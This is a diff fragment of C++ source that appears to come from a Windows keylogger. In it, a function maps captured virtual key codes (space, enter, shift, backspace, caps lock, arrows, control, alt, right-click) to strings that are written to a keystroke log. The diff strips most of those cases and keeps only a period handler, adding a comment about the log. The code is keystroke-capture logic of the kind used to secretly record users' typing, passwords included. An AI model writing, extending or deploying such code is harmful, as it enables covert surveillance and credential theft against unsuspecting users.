@@ -56,87 +56,15 @@ void AddKey(string input)
 	}
 }
 
-
+//Here we can find all the special cases keys. For example, the period key
+//would not show up proberly in the log. This function fixes it all.
 bool SpecialCases(int key)
 {
 	switch (key) 
 	{
-
-	case VK_SPACE:
-		cout << " ";
-		AddKey(" ");
-		return true;
-
-	case VK_RETURN:
-		cout << "\n";
-		AddKey("\n");
-		return true;
-
-
-		//these two don't work properly
-	case '¾':
-		cout << ".";
+	//For the period key ( '.' )
+	case 0xBE:
 		AddKey(".");
-		return true;
-
-	case '¼':
-		cout << ",";
-		AddKey(",");
-		return true;
-
-	case VK_SHIFT:
-		cout << "#SHIFT#";
-		AddKey("#SHIFT#");
-		return true;
-
-	case VK_BACK:
-		cout << "\b";
-		AddKey("\b");
-		return true;
-
-	case VK_RBUTTON:
-		cout << "#R_CLICK#";
-		AddKey("#R_CLICK#");
-		return true;
-
-	case VK_CAPITAL:
-		cout << "#CAPS_LOCK#";
-		AddKey("#CAPS_LCOK");
-		return true;
-
-	case VK_TAB:
-		cout << "#TAB";
-		AddKey("#TAB");
-		return true;
-
-	case VK_UP:
-		cout << "#UP";
-		AddKey("#UP_ARROW_KEY");
-		return true;
-
-	case VK_DOWN:
-		cout << "#DOWN";
-		AddKey("#DOWN_ARROW_KEY");
-		return true;
-
-	case VK_LEFT:
-		cout << "#LEFT";
-		AddKey("#LEFT_ARROW_KEY");
-		return true;
-
-	case VK_RIGHT:
-		cout << "#RIGHT";
-		AddKey("#RIGHT_ARROW_KEY");
-		return true;
-
-	case VK_CONTROL:
-		cout << "#CONTROL";
-		AddKey("#CONTROL");
-		return true;
-
-	case VK_MENU:
-		cout << "#ALT";
-		AddKey("#ALT");
 		return true;
 
 	default: 
